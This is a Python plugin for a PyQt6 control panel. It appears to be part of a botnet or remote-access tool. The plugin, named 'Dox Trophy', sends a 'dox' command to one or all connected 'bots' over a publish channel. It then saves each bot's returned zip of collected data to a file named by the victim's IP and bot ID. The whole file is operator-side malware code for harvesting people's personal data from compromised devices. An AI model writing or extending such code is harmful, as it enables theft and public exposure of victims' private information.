# plugins/dox.py
from PyQt6.QtWidgets import QMessageBox
from .base_plugin import BasePlugin
import json
import binascii
import zipfile

class DoxPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Dox Trophy"
        self.menu_action = self.name
        self.priority = 20

    def execute(self, target):
        if target == 'all' and len(self.parent.device_status) > 10:
            QMessageBox.warning(self.parent, 'Warning', 'Too many connections, please select one.')
            return
        command = {'type': 'command', 'target': target, 'action': 'dox'}
        message = json.dumps(command)
        self.parent.client.publish(self.parent.topic, message)
        self.parent.log_area.append(f"Sent command: {command}")

    def handle_response(self, data):
        if data.get('type') == 'dox_response':
            ip = data['ip']
            bot_id = data['id']
            zip_hex = data['zip_data']
            zip_bytes = binascii.unhexlify(zip_hex)
            filename = f"dox_{ip}_{bot_id}.zip"
            with open(filename, 'wb') as f:
                f.write(zip_bytes)
            self.parent.log_area.append(f"Saved dox data to {filename}")